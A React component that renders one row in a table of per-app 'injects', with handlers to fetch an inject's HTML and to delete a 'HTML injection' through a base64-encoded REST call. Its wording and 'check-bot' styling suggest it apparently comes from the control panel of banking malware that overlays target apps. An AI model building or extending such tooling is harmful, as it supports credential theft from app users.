import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';


class InjectRow extends React.Component {

    YesOrNo (param) {
        return param == '1' ? <i class="fa-green far fa-check-circle"></i> : <i class="fa-red far fa-times"></i>;
    }

    onLoadJsonHTMLDATA () {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getHtmlFileOfInject", "app":"' + this.props.app + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    SettingsContext.HTMLShowContentBase64 = result.html;
                    SettingsContext.InjectSelectedAPPName = this.props.app;
					this.props.InjListForceUpdate();
                    try_eval('$("#ShowInjectModal").modal("show");');
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error load inject info.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    OnDeleteInject() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"deleteHtmlInjection","app":"' + this.props.app + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
					SettingsContext.UpdateInjectsTable();
				}
				else {
					SettingsContext.ShowToast('success', 'Inject removed');
					SettingsContext.UpdateInjectsTable();
					this.props.InjListForceUpdate();
				}
			}
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error remove inject. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () {
        const TextAlignCenter = {
            textAlign: 'center'
        }
        const TextAlignRight = {
            textAlign: 'right',
            padding: '0px'
        }
        const MarginRight = {
            marginRight: '10px'
        }
        
        return (
            <tr>
                <th><a onClick={this.onLoadJsonHTMLDATA.bind(this)}>{this.props.app}</a></th>
                <th style={TextAlignCenter}>{this.YesOrNo(this.props.html)}</th>
                <th style={TextAlignCenter}>{this.YesOrNo(this.props.icon)}</th>
                <td class="check-bot" style={TextAlignRight}><i class="fal fa-trash-alt" onClick={this.OnDeleteInject.bind(this)} style={MarginRight}></i></td>
            </tr>
        );
    }
}

export default InjectRow;